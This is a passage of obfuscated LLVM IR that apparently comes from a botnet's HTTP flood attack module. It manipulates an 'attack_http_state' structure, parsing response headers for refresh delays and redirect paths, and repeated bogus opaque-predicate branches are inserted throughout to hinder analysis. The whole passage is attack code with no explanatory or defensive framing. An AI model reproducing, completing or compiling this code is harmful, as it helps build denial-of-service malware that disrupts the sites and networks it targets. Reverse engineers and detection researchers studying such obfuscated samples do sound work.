  %2595 = icmp eq i32 %2594, 0
  %2596 = icmp slt i32 %2591, 10
  %2597 = or i1 %2595, %2596
  br i1 %2597, label %originalBBpart2383, label %originalBB381alteredBB

originalBBpart2383:                               ; preds = %originalBB381
  br label %2598

; <label>:2598:                                   ; preds = %originalBBpart2383, %2528
  %2599 = load i32, i32* @x.17
  %2600 = load i32, i32* @y.18
  %2601 = sub i32 %2599, 1
  %2602 = mul i32 %2599, %2601
  %2603 = urem i32 %2602, 2
  %2604 = icmp eq i32 %2603, 0
  %2605 = icmp slt i32 %2600, 10
  %2606 = or i1 %2604, %2605
  br i1 %2606, label %originalBB385, label %originalBB385alteredBB

originalBB385:                                    ; preds = %originalBB385alteredBB, %2598
  %2607 = load i32, i32* @x.17
  %2608 = load i32, i32* @y.18
  %2609 = sub i32 %2607, 1
  %2610 = mul i32 %2607, %2609
  %2611 = urem i32 %2610, 2
  %2612 = icmp eq i32 %2611, 0
  %2613 = icmp slt i32 %2608, 10
  %2614 = or i1 %2612, %2613
  br i1 %2614, label %originalBBpart2387, label %originalBB385alteredBB

originalBBpart2387:                               ; preds = %originalBB385
  br label %2615

; <label>:2615:                                   ; preds = %originalBBpart2387, %2527
  %2616 = load i32, i32* @x.17
  %2617 = load i32, i32* @y.18
  %2618 = sub i32 %2616, 1
  %2619 = mul i32 %2616, %2618
  %2620 = urem i32 %2619, 2
  %2621 = icmp eq i32 %2620, 0
  %2622 = icmp slt i32 %2617, 10
  %2623 = or i1 %2621, %2622
  br i1 %2623, label %originalBB389, label %originalBB389alteredBB

originalBB389:                                    ; preds = %originalBB389alteredBB, %2615
  %2624 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2625 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2624, i32 0, i32 1
  store i8 1, i8* %2625, align 4
  %2626 = load i32, i32* @x.17
  %2627 = load i32, i32* @y.18
  %2628 = sub i32 %2626, 1
  %2629 = mul i32 %2626, %2628
  %2630 = urem i32 %2629, 2
  %2631 = icmp eq i32 %2630, 0
  %2632 = icmp slt i32 %2627, 10
  %2633 = or i1 %2631, %2632
  br i1 %2633, label %originalBBpart2391, label %originalBB389alteredBB

originalBBpart2391:                               ; preds = %originalBB389
  br label %4025

; <label>:2634:                                   ; preds = %2326
  br label %2635

; <label>:2635:                                   ; preds = %2634, %2290
  %2636 = load i32, i32* @x.17
  %2637 = load i32, i32* @y.18
  %2638 = sub i32 %2636, 1
  %2639 = mul i32 %2636, %2638
  %2640 = urem i32 %2639, 2
  %2641 = icmp eq i32 %2640, 0
  %2642 = icmp slt i32 %2637, 10
  %2643 = or i1 %2641, %2642
  br i1 %2643, label %originalBB393, label %originalBB393alteredBB

originalBB393:                                    ; preds = %originalBB393alteredBB, %2635
  %2644 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2645 = load i32, i32* %12, align 4
  %2646 = call i8* @table_retrieve_val(i32 44, i32* null)
  %2647 = call i32 @util_stristr(i8* %2644, i32 %2645, i8* %2646)
  %2648 = icmp ne i32 %2647, -1
  %2649 = load i32, i32* @x.17
  %2650 = load i32, i32* @y.18
  %2651 = sub i32 %2649, 1
  %2652 = mul i32 %2649, %2651
  %2653 = urem i32 %2652, 2
  %2654 = icmp eq i32 %2653, 0
  %2655 = icmp slt i32 %2650, 10
  %2656 = or i1 %2654, %2655
  br i1 %2656, label %originalBBpart2395, label %originalBB393alteredBB

originalBBpart2395:                               ; preds = %originalBB393
  br i1 %2648, label %2657, label %3227

; <label>:2657:                                   ; preds = %originalBBpart2395
  %2658 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2659 = load i32, i32* %12, align 4
  %2660 = call i8* @table_retrieve_val(i32 44, i32* null)
  %2661 = call i32 @util_stristr(i8* %2658, i32 %2659, i8* %2660)
  store i32 %2661, i32* %55, align 4
  %2662 = load i32, i32* %55, align 4
  %2663 = sext i32 %2662 to i64
  %2664 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2663
  %2665 = load i8, i8* %2664, align 1
  %2666 = sext i8 %2665 to i32
  %2667 = icmp eq i32 %2666, 32
  br i1 %2667, label %2668, label %2671

; <label>:2668:                                   ; preds = %2657
  %2669 = load i32, i32* %55, align 4
  %2670 = add nsw i32 %2669, 1
  store i32 %2670, i32* %55, align 4
  br label %2671

; <label>:2671:                                   ; preds = %2668, %2657
  %2672 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2673 = load i32, i32* %55, align 4
  %2674 = sext i32 %2673 to i64
  %2675 = getelementptr inbounds i8, i8* %2672, i64 %2674
  %2676 = load i32, i32* %12, align 4
  %2677 = load i32, i32* %55, align 4
  %2678 = sub nsw i32 %2676, %2677
  %2679 = call i32 @util_memsearch(i8* %2675, i32 %2678, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2679, i32* %56, align 4
  %2680 = load i32, i32* %56, align 4
  %2681 = icmp ne i32 %2680, -1
  br i1 %2681, label %2682, label %3226

; <label>:2682:                                   ; preds = %2671
  %2683 = load i32, i32* %55, align 4
  %2684 = sext i32 %2683 to i64
  %2685 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2684
  store i8* %2685, i8** %57, align 8
  %2686 = load i32, i32* %56, align 4
  %2687 = icmp sge i32 %2686, 2
  br i1 %2687, label %2688, label %2707

; <label>:2688:                                   ; preds = %2682
  %2689 = load i32, i32* @x.17
  %2690 = load i32, i32* @y.18
  %2691 = sub i32 %2689, 1
  %2692 = mul i32 %2689, %2691
  %2693 = urem i32 %2692, 2
  %2694 = icmp eq i32 %2693, 0
  %2695 = icmp slt i32 %2690, 10
  %2696 = or i1 %2694, %2695
  br i1 %2696, label %originalBB397, label %originalBB397alteredBB

originalBB397:                                    ; preds = %originalBB397alteredBB, %2688
  %2697 = load i32, i32* %56, align 4
  %2698 = sub nsw i32 %2697, 2
  store i32 %2698, i32* %56, align 4
  %2699 = load i32, i32* @x.17
  %2700 = load i32, i32* @y.18
  %2701 = sub i32 %2699, 1
  %2702 = mul i32 %2699, %2701
  %2703 = urem i32 %2702, 2
  %2704 = icmp eq i32 %2703, 0
  %2705 = icmp slt i32 %2700, 10
  %2706 = or i1 %2704, %2705
  br i1 %2706, label %originalBBpart2405, label %originalBB397alteredBB

originalBBpart2405:                               ; preds = %originalBB397
  br label %2707

; <label>:2707:                                   ; preds = %originalBBpart2405, %2682
  %2708 = load i32, i32* %55, align 4
  %2709 = load i32, i32* %56, align 4
  %2710 = add nsw i32 %2708, %2709
  %2711 = sext i32 %2710 to i64
  %2712 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2711
  store i8 0, i8* %2712, align 1
  %2713 = load i32, i32* %56, align 4
  %2714 = add nsw i32 %2713, 1
  store i32 %2714, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %2715

; <label>:2715:                                   ; preds = %2773, %2707
  %2716 = load i8*, i8** %57, align 8
  %2717 = load i32, i32* %10, align 4
  %2718 = sext i32 %2717 to i64
  %2719 = getelementptr inbounds i8, i8* %2716, i64 %2718
  %2720 = load i8, i8* %2719, align 1
  %2721 = sext i8 %2720 to i32
  %2722 = icmp ne i32 %2721, 0
  br i1 %2722, label %2723, label %2755

; <label>:2723:                                   ; preds = %2715
  %2724 = load i8*, i8** %57, align 8
  %2725 = load i32, i32* %10, align 4
  %2726 = sext i32 %2725 to i64
  %2727 = getelementptr inbounds i8, i8* %2724, i64 %2726
  %2728 = load i8, i8* %2727, align 1
  %2729 = sext i8 %2728 to i32
  %2730 = icmp sge i32 %2729, 48
  br i1 %2730, label %2731, label %2755

; <label>:2731:                                   ; preds = %2723
  %2732 = load i32, i32* @x.17
  %2733 = load i32, i32* @y.18
  %2734 = sub i32 %2732, 1
  %2735 = mul i32 %2732, %2734
  %2736 = urem i32 %2735, 2
  %2737 = icmp eq i32 %2736, 0
  %2738 = icmp slt i32 %2733, 10
  %2739 = or i1 %2737, %2738
  br i1 %2739, label %originalBB407, label %originalBB407alteredBB

originalBB407:                                    ; preds = %originalBB407alteredBB, %2731
  %2740 = load i8*, i8** %57, align 8
  %2741 = load i32, i32* %10, align 4
  %2742 = sext i32 %2741 to i64
  %2743 = getelementptr inbounds i8, i8* %2740, i64 %2742
  %2744 = load i8, i8* %2743, align 1
  %2745 = sext i8 %2744 to i32
  %2746 = icmp sle i32 %2745, 57
  %2747 = load i32, i32* @x.17
  %2748 = load i32, i32* @y.18
  %2749 = sub i32 %2747, 1
  %2750 = mul i32 %2747, %2749
  %2751 = urem i32 %2750, 2
  %2752 = icmp eq i32 %2751, 0
  %2753 = icmp slt i32 %2748, 10
  %2754 = or i1 %2752, %2753
  br i1 %2754, label %originalBBpart2409, label %originalBB407alteredBB

originalBBpart2409:                               ; preds = %originalBB407
  br label %2755

; <label>:2755:                                   ; preds = %originalBBpart2409, %2723, %2715
  %2756 = phi i1 [ false, %2723 ], [ false, %2715 ], [ %2746, %originalBBpart2409 ]
  %2757 = load i32, i32* @x.17
  %2758 = load i32, i32* @y.18
  %2759 = sub i32 %2757, 1
  %2760 = mul i32 %2757, %2759
  %2761 = urem i32 %2760, 2
  %2762 = icmp eq i32 %2761, 0
  %2763 = icmp slt i32 %2758, 10
  %2764 = or i1 %2762, %2763
  br i1 %2764, label %originalBB411, label %originalBB411alteredBB

originalBB411:                                    ; preds = %originalBB411alteredBB, %2755
  %2765 = load i32, i32* @x.17
  %2766 = load i32, i32* @y.18
  %2767 = sub i32 %2765, 1
  %2768 = mul i32 %2765, %2767
  %2769 = urem i32 %2768, 2
  %2770 = icmp eq i32 %2769, 0
  %2771 = icmp slt i32 %2766, 10
  %2772 = or i1 %2770, %2771
  br i1 %2772, label %originalBBpart2413, label %originalBB411alteredBB

originalBBpart2413:                               ; preds = %originalBB411
  br i1 %2756, label %2773, label %2776

; <label>:2773:                                   ; preds = %originalBBpart2413
  %2774 = load i32, i32* %10, align 4
  %2775 = add nsw i32 %2774, 1
  store i32 %2775, i32* %10, align 4
  br label %2715

; <label>:2776:                                   ; preds = %originalBBpart2413
  %2777 = load i8*, i8** %57, align 8
  %2778 = load i32, i32* %10, align 4
  %2779 = sext i32 %2778 to i64
  %2780 = getelementptr inbounds i8, i8* %2777, i64 %2779
  %2781 = load i8, i8* %2780, align 1
  %2782 = sext i8 %2781 to i32
  %2783 = icmp ne i32 %2782, 0
  br i1 %2783, label %2784, label %3209

; <label>:2784:                                   ; preds = %2776
  store i32 0, i32* %58, align 4
  %2785 = load i8*, i8** %57, align 8
  %2786 = load i32, i32* %10, align 4
  %2787 = sext i32 %2786 to i64
  %2788 = getelementptr inbounds i8, i8* %2785, i64 %2787
  store i8 0, i8* %2788, align 1
  %2789 = load i32, i32* %10, align 4
  %2790 = add nsw i32 %2789, 1
  store i32 %2790, i32* %10, align 4
  %2791 = load i8*, i8** %57, align 8
  %2792 = load i32, i32* %10, align 4
  %2793 = sext i32 %2792 to i64
  %2794 = getelementptr inbounds i8, i8* %2791, i64 %2793
  %2795 = load i8, i8* %2794, align 1
  %2796 = sext i8 %2795 to i32
  %2797 = icmp eq i32 %2796, 32
  br i1 %2797, label %2798, label %2801

; <label>:2798:                                   ; preds = %2784
  %2799 = load i32, i32* %10, align 4
  %2800 = add nsw i32 %2799, 1
  store i32 %2800, i32* %10, align 4
  br label %2801

; <label>:2801:                                   ; preds = %2798, %2784
  %2802 = load i8*, i8** %57, align 8
  %2803 = load i32, i32* %10, align 4
  %2804 = sext i32 %2803 to i64
  %2805 = getelementptr inbounds i8, i8* %2802, i64 %2804
  %2806 = load i8*, i8** %57, align 8
  %2807 = load i32, i32* %10, align 4
  %2808 = sext i32 %2807 to i64
  %2809 = getelementptr inbounds i8, i8* %2806, i64 %2808
  %2810 = call i32 @util_strlen(i8* %2809)
  %2811 = call i32 @util_stristr(i8* %2805, i32 %2810, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2812 = icmp ne i32 %2811, -1
  br i1 %2812, label %2813, label %2826

; <label>:2813:                                   ; preds = %2801
  %2814 = load i8*, i8** %57, align 8
  %2815 = load i32, i32* %10, align 4
  %2816 = sext i32 %2815 to i64
  %2817 = getelementptr inbounds i8, i8* %2814, i64 %2816
  %2818 = load i8*, i8** %57, align 8
  %2819 = load i32, i32* %10, align 4
  %2820 = sext i32 %2819 to i64
  %2821 = getelementptr inbounds i8, i8* %2818, i64 %2820
  %2822 = call i32 @util_strlen(i8* %2821)
  %2823 = call i32 @util_stristr(i8* %2817, i32 %2822, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2824 = load i32, i32* %10, align 4
  %2825 = add nsw i32 %2824, %2823
  store i32 %2825, i32* %10, align 4
  br label %2826

; <label>:2826:                                   ; preds = %2813, %2801
  %2827 = load i32, i32* @x.17
  %2828 = load i32, i32* @y.18
  %2829 = sub i32 %2827, 1
  %2830 = mul i32 %2827, %2829
  %2831 = urem i32 %2830, 2
  %2832 = icmp eq i32 %2831, 0
  %2833 = icmp slt i32 %2828, 10
  %2834 = or i1 %2832, %2833
  br i1 %2834, label %originalBB415, label %originalBB415alteredBB

originalBB415:                                    ; preds = %originalBB415alteredBB, %2826
  %2835 = load i8*, i8** %57, align 8
  %2836 = load i32, i32* %10, align 4
  %2837 = sext i32 %2836 to i64
  %2838 = getelementptr inbounds i8, i8* %2835, i64 %2837
  %2839 = load i8, i8* %2838, align 1
  %2840 = sext i8 %2839 to i32
  %2841 = icmp eq i32 %2840, 34
  %2842 = load i32, i32* @x.17
  %2843 = load i32, i32* @y.18
  %2844 = sub i32 %2842, 1
  %2845 = mul i32 %2842, %2844
  %2846 = urem i32 %2845, 2
  %2847 = icmp eq i32 %2846, 0
  %2848 = icmp slt i32 %2843, 10
  %2849 = or i1 %2847, %2848
  br i1 %2849, label %originalBBpart2417, label %originalBB415alteredBB

originalBBpart2417:                               ; preds = %originalBB415
  br i1 %2841, label %2850, label %2898

; <label>:2850:                                   ; preds = %originalBBpart2417
  %2851 = load i32, i32* @x.17
  %2852 = load i32, i32* @y.18
  %2853 = sub i32 %2851, 1
  %2854 = mul i32 %2851, %2853
  %2855 = urem i32 %2854, 2
  %2856 = icmp eq i32 %2855, 0
  %2857 = icmp slt i32 %2852, 10
  %2858 = or i1 %2856, %2857
  br i1 %2858, label %originalBB419, label %originalBB419alteredBB

originalBB419:                                    ; preds = %originalBB419alteredBB, %2850
  %2859 = load i32, i32* %10, align 4
  %2860 = add nsw i32 %2859, 1
  store i32 %2860, i32* %10, align 4
  %2861 = load i8*, i8** %57, align 8
  %2862 = load i32, i32* %10, align 4
  %2863 = sext i32 %2862 to i64
  %2864 = getelementptr inbounds i8, i8* %2861, i64 %2863
  %2865 = load i8*, i8** %57, align 8
  %2866 = load i32, i32* %10, align 4
  %2867 = sext i32 %2866 to i64
  %2868 = getelementptr inbounds i8, i8* %2865, i64 %2867
  %2869 = call i32 @util_strlen(i8* %2868)
  %2870 = sub nsw i32 %2869, 1
  %2871 = sext i32 %2870 to i64
  %2872 = getelementptr inbounds i8, i8* %2864, i64 %2871
  %2873 = load i8, i8* %2872, align 1
  %2874 = sext i8 %2873 to i32
  %2875 = icmp eq i32 %2874, 34
  %2876 = load i32, i32* @x.17
  %2877 = load i32, i32* @y.18
  %2878 = sub i32 %2876, 1
  %2879 = mul i32 %2876, %2878
  %2880 = urem i32 %2879, 2
  %2881 = icmp eq i32 %2880, 0
  %2882 = icmp slt i32 %2877, 10
  %2883 = or i1 %2881, %2882
  br i1 %2883, label %originalBBpart2437, label %originalBB419alteredBB

originalBBpart2437:                               ; preds = %originalBB419
  br i1 %2875, label %2884, label %2897

; <label>:2884:                                   ; preds = %originalBBpart2437
  %2885 = load i8*, i8** %57, align 8
  %2886 = load i32, i32* %10, align 4
  %2887 = sext i32 %2886 to i64
  %2888 = getelementptr inbounds i8, i8* %2885, i64 %2887
  %2889 = load i8*, i8** %57, align 8
  %2890 = load i32, i32* %10, align 4
  %2891 = sext i32 %2890 to i64
  %2892 = getelementptr inbounds i8, i8* %2889, i64 %2891
  %2893 = call i32 @util_strlen(i8* %2892)
  %2894 = sub nsw i32 %2893, 1
  %2895 = sext i32 %2894 to i64
  %2896 = getelementptr inbounds i8, i8* %2888, i64 %2895
  store i8 0, i8* %2896, align 1
  br label %2897

; <label>:2897:                                   ; preds = %2884, %originalBBpart2437
  br label %2898

; <label>:2898:                                   ; preds = %2897, %originalBBpart2417
  %2899 = load i8*, i8** %57, align 8
  %2900 = call i32 @util_atoi(i8* %2899, i32 10)
  store i32 %2900, i32* %58, align 4
  br label %2901

; <label>:2901:                                   ; preds = %2932, %2898
  %2902 = load i32, i32* %58, align 4
  %2903 = icmp sgt i32 %2902, 0
  br i1 %2903, label %2904, label %2930

; <label>:2904:                                   ; preds = %2901
  %2905 = load i32, i32* %58, align 4
  %2906 = icmp slt i32 %2905, 10
  br i1 %2906, label %2907, label %2930

; <label>:2907:                                   ; preds = %2904
  %2908 = load i32, i32* @x.17
  %2909 = load i32, i32* @y.18
  %2910 = sub i32 %2908, 1
  %2911 = mul i32 %2908, %2910
  %2912 = urem i32 %2911, 2
  %2913 = icmp eq i32 %2912, 0
  %2914 = icmp slt i32 %2909, 10
  %2915 = or i1 %2913, %2914
  br i1 %2915, label %originalBB439, label %originalBB439alteredBB

originalBB439:                                    ; preds = %originalBB439alteredBB, %2907
  %2916 = load i32, i32* %27, align 4
  %2917 = load i32, i32* %58, align 4
  %2918 = add i32 %2916, %2917
  %2919 = zext i32 %2918 to i64
  %2920 = call i64 @time(i64* null) #6
  %2921 = icmp sgt i64 %2919, %2920
  %2922 = load i32, i32* @x.17
  %2923 = load i32, i32* @y.18
  %2924 = sub i32 %2922, 1
  %2925 = mul i32 %2922, %2924
  %2926 = urem i32 %2925, 2
  %2927 = icmp eq i32 %2926, 0
  %2928 = icmp slt i32 %2923, 10
  %2929 = or i1 %2927, %2928
  br i1 %2929, label %originalBBpart2448, label %originalBB439alteredBB

originalBBpart2448:                               ; preds = %originalBB439
  br label %2930

; <label>:2930:                                   ; preds = %originalBBpart2448, %2904, %2901
  %2931 = phi i1 [ false, %2904 ], [ false, %2901 ], [ %2921, %originalBBpart2448 ]
  br i1 %2931, label %2932, label %2934

; <label>:2932:                                   ; preds = %2930
  %2933 = call i32 @sleep(i32 1)
  br label %2901

; <label>:2934:                                   ; preds = %2930
  %2935 = load i32, i32* @x.17
  %2936 = load i32, i32* @y.18
  %2937 = sub i32 %2935, 1
  %2938 = mul i32 %2935, %2937
  %2939 = urem i32 %2938, 2
  %2940 = icmp eq i32 %2939, 0
  %2941 = icmp slt i32 %2936, 10
  %2942 = or i1 %2940, %2941
  br i1 %2942, label %originalBB450, label %originalBB450alteredBB

originalBB450:                                    ; preds = %originalBB450alteredBB, %2934
  %2943 = load i8*, i8** %57, align 8
  %2944 = load i32, i32* %10, align 4
  %2945 = sext i32 %2944 to i64
  %2946 = getelementptr inbounds i8, i8* %2943, i64 %2945
  store i8* %2946, i8** %57, align 8
  %2947 = load i8*, i8** %57, align 8
  %2948 = load i8*, i8** %57, align 8
  %2949 = call i32 @util_strlen(i8* %2948)
  %2950 = call i32 @util_stristr(i8* %2947, i32 %2949, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2951 = icmp eq i32 %2950, 4
  %2952 = load i32, i32* @x.17
  %2953 = load i32, i32* @y.18
  %2954 = sub i32 %2952, 1
  %2955 = mul i32 %2952, %2954
  %2956 = urem i32 %2955, 2
  %2957 = icmp eq i32 %2956, 0
  %2958 = icmp slt i32 %2953, 10
  %2959 = or i1 %2957, %2958
  br i1 %2959, label %originalBBpart2452, label %originalBB450alteredBB

originalBBpart2452:                               ; preds = %originalBB450
  br i1 %2951, label %2960, label %3114

; <label>:2960:                                   ; preds = %originalBBpart2452
  %2961 = load i32, i32* @x.17
  %2962 = load i32, i32* @y.18
  %2963 = sub i32 %2961, 1
  %2964 = mul i32 %2961, %2963
  %2965 = urem i32 %2964, 2
  %2966 = icmp eq i32 %2965, 0
  %2967 = icmp slt i32 %2962, 10
  %2968 = or i1 %2966, %2967
  br i1 %2968, label %originalBB454, label %originalBB454alteredBB

originalBB454:                                    ; preds = %originalBB454alteredBB, %2960
  store i32 7, i32* %10, align 4
  %2969 = load i8*, i8** %57, align 8
  %2970 = getelementptr inbounds i8, i8* %2969, i64 4
  %2971 = load i8, i8* %2970, align 1
  %2972 = sext i8 %2971 to i32
  %2973 = icmp eq i32 %2972, 115
  %2974 = load i32, i32* @x.17
  %2975 = load i32, i32* @y.18
  %2976 = sub i32 %2974, 1
  %2977 = mul i32 %2974, %2976
  %2978 = urem i32 %2977, 2
  %2979 = icmp eq i32 %2978, 0
  %2980 = icmp slt i32 %2975, 10
  %2981 = or i1 %2979, %2980
  br i1 %2981, label %originalBBpart2456, label %originalBB454alteredBB

originalBBpart2456:                               ; preds = %originalBB454
  br i1 %2973, label %2982, label %2985

; <label>:2982:                                   ; preds = %originalBBpart2456
  %2983 = load i32, i32* %10, align 4
  %2984 = add nsw i32 %2983, 1
  store i32 %2984, i32* %10, align 4
  br label %2985

; <label>:2985:                                   ; preds = %2982, %originalBBpart2456
  %2986 = load i8*, i8** %57, align 8
  %2987 = load i8*, i8** %57, align 8
  %2988 = load i32, i32* %10, align 4
  %2989 = sext i32 %2988 to i64
  %2990 = getelementptr inbounds i8, i8* %2987, i64 %2989
  %2991 = load i32, i32* %56, align 4
  %2992 = load i32, i32* %10, align 4
  %2993 = sub nsw i32 %2991, %2992
  %2994 = sext i32 %2993 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2986, i8* %2990, i64 %2994, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2995

; <label>:2995:                                   ; preds = %3032, %2985
  %2996 = load i32, i32* @x.17
  %2997 = load i32, i32* @y.18
  %2998 = sub i32 %2996, 1
  %2999 = mul i32 %2996, %2998
  %3000 = urem i32 %2999, 2
  %3001 = icmp eq i32 %3000, 0
  %3002 = icmp slt i32 %2997, 10
  %3003 = or i1 %3001, %3002
  br i1 %3003, label %originalBB458, label %originalBB458alteredBB

originalBB458:                                    ; preds = %originalBB458alteredBB, %2995
  %3004 = load i8*, i8** %57, align 8
  %3005 = load i32, i32* %10, align 4
  %3006 = sext i32 %3005 to i64
  %3007 = getelementptr inbounds i8, i8* %3004, i64 %3006
  %3008 = load i8, i8* %3007, align 1
  %3009 = sext i8 %3008 to i32
  %3010 = icmp ne i32 %3009, 0
  %3011 = load i32, i32* @x.17
  %3012 = load i32, i32* @y.18
  %3013 = sub i32 %3011, 1
  %3014 = mul i32 %3011, %3013
  %3015 = urem i32 %3014, 2
  %3016 = icmp eq i32 %3015, 0
  %3017 = icmp slt i32 %3012, 10
  %3018 = or i1 %3016, %3017
  br i1 %3018, label %originalBBpart2460, label %originalBB458alteredBB

originalBBpart2460:                               ; preds = %originalBB458
  br i1 %3010, label %3019, label %3035

; <label>:3019:                                   ; preds = %originalBBpart2460
  %3020 = load i8*, i8** %57, align 8
  %3021 = load i32, i32* %10, align 4
  %3022 = sext i32 %3021 to i64
  %3023 = getelementptr inbounds i8, i8* %3020, i64 %3022
  %3024 = load i8, i8* %3023, align 1
  %3025 = sext i8 %3024 to i32
  %3026 = icmp eq i32 %3025, 47
  br i1 %3026, label %3027, label %3032

; <label>:3027:                                   ; preds = %3019
  %3028 = load i8*, i8** %57, align 8
  %3029 = load i32, i32* %10, align 4
  %3030 = sext i32 %3029 to i64
  %3031 = getelementptr inbounds i8, i8* %3028, i64 %3030
  store i8 0, i8* %3031, align 1
  br label %3035

; <label>:3032:                                   ; preds = %3019
  %3033 = load i32, i32* %10, align 4
  %3034 = add nsw i32 %3033, 1
  store i32 %3034, i32* %10, align 4
  br label %2995

; <label>:3035:                                   ; preds = %3027, %originalBBpart2460
  %3036 = load i8*, i8** %57, align 8
  %3037 = call i32 @util_strlen(i8* %3036)
  %3038 = icmp sgt i32 %3037, 0
  br i1 %3038, label %3039, label %3065

; <label>:3039:                                   ; preds = %3035
  %3040 = load i32, i32* @x.17
  %3041 = load i32, i32* @y.18
  %3042 = sub i32 %3040, 1
  %3043 = mul i32 %3040, %3042
  %3044 = urem i32 %3043, 2
  %3045 = icmp eq i32 %3044, 0
  %3046 = icmp slt i32 %3041, 10
  %3047 = or i1 %3045, %3046
  br i1 %3047, label %originalBB462, label %originalBB462alteredBB

originalBB462:                                    ; preds = %originalBB462alteredBB, %3039
  %3048 = load i8*, i8** %57, align 8
  %3049 = call i32 @util_strlen(i8* %3048)
  %3050 = icmp slt i32 %3049, 128
  %3051 = load i32, i32* @x.17
  %3052 = load i32, i32* @y.18
  %3053 = sub i32 %3051, 1
  %3054 = mul i32 %3051, %3053
  %3055 = urem i32 %3054, 2
  %3056 = icmp eq i32 %3055, 0
  %3057 = icmp slt i32 %3052, 10
  %3058 = or i1 %3056, %3057
  br i1 %3058, label %originalBBpart2464, label %originalBB462alteredBB

originalBBpart2464:                               ; preds = %originalBB462
  br i1 %3050, label %3059, label %3065

; <label>:3059:                                   ; preds = %originalBBpart2464
  %3060 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3061 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3060, i32 0, i32 7
  %3062 = getelementptr inbounds [129 x i8], [129 x i8]* %3061, i32 0, i32 0
  %3063 = load i8*, i8** %57, align 8
  %3064 = call i32 @util_strcpy(i8* %3062, i8* %3063)
  br label %3065

; <label>:3065:                                   ; preds = %3059, %originalBBpart2464, %3035
  %3066 = load i8*, i8** %57, align 8
  %3067 = load i32, i32* %10, align 4
  %3068 = add nsw i32 %3067, 1
  %3069 = sext i32 %3068 to i64
  %3070 = getelementptr inbounds i8, i8* %3066, i64 %3069
  %3071 = call i32 @util_strlen(i8* %3070)
  %3072 = icmp slt i32 %3071, 256
  br i1 %3072, label %3073, label %3113

; <label>:3073:                                   ; preds = %3065
  %3074 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3075 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3074, i32 0, i32 6
  %3076 = getelementptr inbounds [257 x i8], [257 x i8]* %3075, i32 0, i32 0
  %3077 = getelementptr inbounds i8, i8* %3076, i64 1
  call void @util_zero(i8* %3077, i32 255)
  %3078 = load i8*, i8** %57, align 8
  %3079 = load i32, i32* %10, align 4
  %3080 = add nsw i32 %3079, 1
  %3081 = sext i32 %3080 to i64
  %3082 = getelementptr inbounds i8, i8* %3078, i64 %3081
  %3083 = call i32 @util_strlen(i8* %3082)
  %3084 = icmp sgt i32 %3083, 0
  br i1 %3084, label %3085, label %3112

; <label>:3085:                                   ; preds = %3073
  %3086 = load i32, i32* @x.17
  %3087 = load i32, i32* @y.18
  %3088 = sub i32 %3086, 1
  %3089 = mul i32 %3086, %3088
  %3090 = urem i32 %3089, 2
  %3091 = icmp eq i32 %3090, 0
  %3092 = icmp slt i32 %3087, 10
  %3093 = or i1 %3091, %3092
  br i1 %3093, label %originalBB466, label %originalBB466alteredBB

originalBB466:                                    ; preds = %originalBB466alteredBB, %3085
  %3094 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3095 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3094, i32 0, i32 6
  %3096 = getelementptr inbounds [257 x i8], [257 x i8]* %3095, i32 0, i32 0
  %3097 = getelementptr inbounds i8, i8* %3096, i64 1
  %3098 = load i8*, i8** %57, align 8
  %3099 = load i32, i32* %10, align 4
  %3100 = add nsw i32 %3099, 1
  %3101 = sext i32 %3100 to i64
  %3102 = getelementptr inbounds i8, i8* %3098, i64 %3101
  %3103 = call i32 @util_strcpy(i8* %3097, i8* %3102)
  %3104 = load i32, i32* @x.17
  %3105 = load i32, i32* @y.18
  %3106 = sub i32 %3104, 1
  %3107 = mul i32 %3104, %3106
  %3108 = urem i32 %3107, 2
  %3109 = icmp eq i32 %3108, 0
  %3110 = icmp slt i32 %3105, 10
  %3111 = or i1 %3109, %3110
  br i1 %3111, label %originalBBpart2477, label %originalBB466alteredBB

originalBBpart2477:                               ; preds = %originalBB466
  br label %3112

; <label>:3112:                                   ; preds = %originalBBpart2477, %3073
  br label %3113

; <label>:3113:                                   ; preds = %3112, %3065
  br label %3202

; <label>:3114:                                   ; preds = %originalBBpart2452
  %3115 = load i32, i32* @x.17
  %3116 = load i32, i32* @y.18
  %3117 = sub i32 %3115, 1
  %3118 = mul i32 %3115, %3117
  %3119 = urem i32 %3118, 2
  %3120 = icmp eq i32 %3119, 0
  %3121 = icmp slt i32 %3116, 10
  %3122 = or i1 %3120, %3121
  br i1 %3122, label %originalBB479, label %originalBB479alteredBB

originalBB479:                                    ; preds = %originalBB479alteredBB, %3114
  %3123 = load i8*, i8** %57, align 8
  %3124 = getelementptr inbounds i8, i8* %3123, i64 0
  %3125 = load i8, i8* %3124, align 1
  %3126 = sext i8 %3125 to i32
  %3127 = icmp eq i32 %3126, 47
  %3128 = load i32, i32* @x.17
  %3129 = load i32, i32* @y.18
  %3130 = sub i32 %3128, 1
  %3131 = mul i32 %3128, %3130
  %3132 = urem i32 %3131, 2
  %3133 = icmp eq i32 %3132, 0
  %3134 = icmp slt i32 %3129, 10
  %3135 = or i1 %3133, %3134
  br i1 %3135, label %originalBBpart2481, label %originalBB479alteredBB

originalBBpart2481:                               ; preds = %originalBB479
  br i1 %3127, label %3136, label %3201

; <label>:3136:                                   ; preds = %originalBBpart2481
  %3137 = load i8*, i8** %57, align 8
